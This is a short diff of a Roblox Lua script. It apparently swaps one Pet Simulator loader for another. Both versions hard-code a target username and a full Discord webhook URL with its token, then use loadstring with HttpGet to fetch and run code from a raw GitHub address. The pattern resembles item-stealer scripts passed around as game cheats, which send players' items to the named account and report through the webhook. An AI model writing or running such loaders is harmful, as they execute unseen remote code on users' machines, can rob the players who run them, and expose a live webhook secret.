@@ -1,8 +1,5 @@
-Username = "AewAewwwwww"
-WebHook = "https://discord.com/api/webhooks/1210046370078138368/rT6GPkhLlVrt0mTm87ffN22P6oyALl3xHPMtEeFFaIbvNTSIPu0tjIkibSHZWyzuhXEs"
-_G.CustomScriptName = "Coen"
-G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-...G.Text4 = "Starting Script"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+_G.Username = "AewAewwwwww"
+_G.HubName = "Wait a little"
+_G.WebhookUr1 = "https://discord.com/api/webhooks/1210046370078138368/rT6GPkhLlVrt0mTm87ffN22P6oyALl3xHPMtEeFFaIbvNTSIPu0tjIkibSHZWyzuhXEs"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
